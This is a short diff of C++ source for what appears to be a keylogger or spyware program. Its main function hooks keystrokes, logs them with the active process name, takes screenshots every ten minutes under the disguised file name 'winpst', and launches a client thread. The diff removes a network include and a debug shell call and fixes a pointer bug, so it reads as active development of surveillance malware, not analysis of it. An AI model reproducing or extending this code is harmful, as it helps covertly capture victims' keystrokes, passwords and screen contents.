@@ -2,7 +2,6 @@
 #include "keyhook.h"
 #include "screen.h"
 #include "sys.h"
-#include "network.h"
 #include "debug.h"
 
 #ifdef DEBUG_BUILD
@@ -17,7 +16,7 @@ typedef struct CHStruct {
 
 int main() {
 #ifdef DEBUG_BUILD
-	Sys::CreateShell("/k ipconfig -a");
+
 #endif
 
 #ifndef DEBUG_BUILD
@@ -49,9 +48,9 @@ int main() {
 
 	std::string write = ostream.str();
 	Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
-	Screen::CaptureScreen(path + "\\", "winpst", true,  MINUTE*10); // Screenshot
+	Screen::CaptureScreen(path + "\\", "winpst", true, MINUTE*10); // Screenshot
 
-	pCHStruct pClientThreadHandleParams;
+	auto pClientThreadHandleParams = new CHStruct();
 	pClientThreadHandleParams->file = path; // TODO: Idk if this is the path we need
 	HANDLE keyHookHandle = CreateThread(nullptr, 0, KeyHook::HandleMessage, (LPVOID)1, 0, nullptr);
 	HANDLE clientThreadHandle = CreateThread(nullptr,
